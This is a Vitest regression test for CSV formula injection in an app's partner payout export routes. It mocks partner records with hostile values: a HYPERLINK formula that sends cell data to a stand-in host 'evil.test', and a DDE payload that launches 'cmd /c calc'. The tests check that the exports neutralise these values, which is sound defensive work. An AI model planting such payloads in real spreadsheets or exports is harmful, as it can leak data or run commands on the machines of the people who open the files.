import { describe, expect, it, vi } from "vitest";

// ---------------------------------------------------------------------------
// I-08 REPRODUCTION, against the real export handlers.
//
// A partner's name, email and referral code come from the PUBLIC ambassador
// application form. They are unauthenticated attacker-controlled text, and they
// land in a CSV the owner opens in Excel.
//
// Four escapers in this codebase already neutralise this and say why
// (admin-customers.ts:162-164). Four only quote. Quoting is not the defence:
// Excel strips the surrounding quotes while parsing the field and then
// evaluates a leading '='.
// ---------------------------------------------------------------------------

vi.mock("server-only", () => ({}));

const HOSTILE = '=HYPERLINK("http://evil.test/?d="&A1,"You won")';

vi.mock("@/lib/admin-auth", () => ({
  verifyAdminSessionFromRequest: async () => ({ id: "s1", username: "owner", role: "super_admin" }),
}));

vi.mock("@/lib/partner-portal", () => ({
  getAdminPartnerRows: async () => [{
    id: "p1",
    name: HOSTILE,
    email: "attacker@example.test",
    referralCode: "+SUM(1;1)",
    status: "approved",
    commissionPercent: 20,
    totalRevenue: 0,
    totalOrders: 0,
    pendingCommissions: 0,
    approvedForPayoutCommissions: 0,
    paidCommissions: 0,
    reversedCommissions: 0,
    clicks: 0,
    conversionRate: 0,
  }],
}));

vi.mock("@/lib/admin-ambassadors", () => ({
  getPayoutHistory: async () => [{
    id: "h1",
    createdAt: "2026-08-01T00:00:00.000Z",
    ambassadorName: HOSTILE,
    ambassadorId: "p1",
    amount: 10,
    note: "@SUM(1+1)*cmd|'/c calc'!A1",
  }],
}));

/**
 * A cell is formula-injectable when, after the CSV parser strips the optional
 * surrounding quotes, it still begins with a character Excel treats as the
 * start of a formula.
 */
function injectableCells(csv: string): string[] {
  const bad: string[] = [];
  for (const line of csv.split(/\r?\n/)) {
    // Naive split is fine here: the payloads under test contain no bare commas
    // inside a quoted field except where the test intends it.
    for (const cell of line.split(",")) {
      const unquoted = cell.replace(/^"/, "").replace(/"$/, "");
      if (/^[=+\-@\t\r]/.test(unquoted)) bad.push(unquoted);
    }
  }
  return bad;
}

const request = (url: string) => new Request(url, { headers: { cookie: "vl_admin_session=x" } });

describe("I-08 — partner exports must not carry live formulas into the owner's spreadsheet", () => {
  it("export-payouts neutralises a hostile partner name and referral code", async () => {
    const { GET } = await import("@/app/api/admin/partners/export-payouts/route");
    const csv = await (await GET(request("https://vanta.test/api/admin/partners/export-payouts"))).text();

    expect(csv).toContain("evil.test");        // the value is still exported...
    expect(injectableCells(csv)).toEqual([]);  // ...but not as a live formula
  });

  it("export-payout-history neutralises a hostile ambassador name and note", async () => {
    const { GET } = await import("@/app/api/admin/partners/export-payout-history/route");
    const csv = await (await GET(request("https://vanta.test/api/admin/partners/export-payout-history"))).text();

    expect(csv).toContain("evil.test");
    expect(injectableCells(csv)).toEqual([]);
  });

  it("a negative amount is still readable, not corrupted by the guard", async () => {
    // The guard must not make a real number unreadable -- reversed commissions
    // are legitimately negative.
    const { GET } = await import("@/app/api/admin/partners/export-payout-history/route");
    const csv = await (await GET(request("https://vanta.test/api/admin/partners/export-payout-history"))).text();

    expect(csv).toContain("10.00");
  });
});
